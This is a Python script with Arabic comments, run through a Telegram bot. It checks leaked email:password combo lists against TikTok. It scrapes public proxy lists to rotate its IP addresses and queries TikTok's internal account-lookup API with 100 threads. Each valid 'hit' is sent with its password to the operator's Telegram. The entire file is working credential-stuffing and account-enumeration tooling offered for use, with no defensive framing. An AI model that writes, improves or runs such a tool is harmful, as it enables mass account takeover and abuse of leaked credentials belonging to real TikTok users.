import os
import time
import random
import requests
import threading
import telebot
from concurrent.futures import ThreadPoolExecutor

# --- إعدادات الألوان ---
class Colors:
    G = '\033[92m'
    R = '\033[91m'
    C = '\033[96m'
    W = '\033[0m'

class Stats:
    hits = 0
    bad = 0
    checked = 0
    proxies_list = []
    is_running = False
    total_in_file = 0
    current_hits_list = []

TOKEN = input(f"{Colors.C}[?] Enter Bot Token: {Colors.W}").strip()
ADMIN_ID = input(f"{Colors.C}[?] Enter Your Telegram ID: {Colors.W}").strip()
bot = telebot.TeleBot(TOKEN)

def scrape_proxies():
    urls = [
        "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/officialputuid/proxy-list/master/http.txt"
    ]
    Stats.proxies_list = []
    for url in urls:
        try:
            res = requests.get(url, timeout=10)
            Stats.proxies_list.extend(res.text.splitlines())
        except: continue
    print(f"{Colors.G}[+] Proxies Loaded: {len(Stats.proxies_list)}{Colors.W}")

def check_tiktok(line):
    if ":" not in line: return
    email, password = line.split(":", 1)
    
    # محاولة الفحص مع إعادة المحاولة في حال فشل البروكسي
    attempt = 0
    while attempt < 3: # يحاول 3 مرات ببركسيات مختلفة قبل الاستسلام
        proxy_addr = random.choice(Stats.proxies_list) if Stats.proxies_list else None
        proxies = {"http": f"http://{proxy_addr}", "https": f"http://{proxy_addr}"}
        
        try:
            # استخدام API أسرع وأكثر استقراراً للفحص الأولي
            url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
            params = {"email": email, "aid": "1233", "device_platform": "android"}
            headers = {
                "User-Agent": "com.zhiliaoapp.musically/2022405040 (Linux; U; Android 12)",
                "Accept-Encoding": "gzip, deflate"
            }
            
            response = requests.get(url, params=params, headers=headers, proxies=proxies, timeout=5)
            
            # إذا كان الرد فارغاً أو محظوراً
            if response.status_code != 200:
                attempt += 1
                continue

            data = response.json()
            message = data.get("message", "")

            if message == "success":
                Stats.hits += 1
                hit_info = f"{email}:{password}"
                Stats.current_hits_list.append(hit_info)
                # إرسال فوري
                bot.send_message(ADMIN_ID, f"✅ **New Hit!**\n📧 `{email}`\n🔑 `{password}`", parse_mode="Markdown")
                break # نجح الفحص
            elif "not registered" in str(data) or "error" in message:
                Stats.bad += 1
                break # الحساب غير موجود
            else:
                attempt += 1 # رد غير مفهوم، جرب بروكسي آخر
        except:
            attempt += 1
    
    Stats.checked += 1

# --- أوامر البوت ---
@bot.message_handler(commands=['status'])
def status(message):
    if str(message.from_user.id) != ADMIN_ID: return
    bot.reply_to(message, f"📊 الوضع: {'يعمل' if Stats.is_running else 'متوقف'}\n✅ Hits: {Stats.hits}\n❌ Bad: {Stats.bad}\n🔄 Checked: {Stats.checked} / {Stats.total_in_file}")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if str(message.from_user.id) != ADMIN_ID: return
    if message.document.file_name.endswith('.txt'):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open("data/combo.txt", "wb") as f: f.write(downloaded_file)
        
        combo = open("data/combo.txt", "r", encoding="utf-8", errors="ignore").read().splitlines()
        Stats.total_in_file = len(combo)
        bot.reply_to(message, f"🚀 بدأنا! فحص {Stats.total_in_file} حساب...")
        
        scrape_proxies()
        threading.Thread(target=lambda: [ThreadPoolExecutor(max_workers=100).map(check_tiktok, combo), setattr(Stats, 'is_running', False)]).start()
        Stats.is_running = True

if __name__ == "__main__":
    bot.infinity_polling()
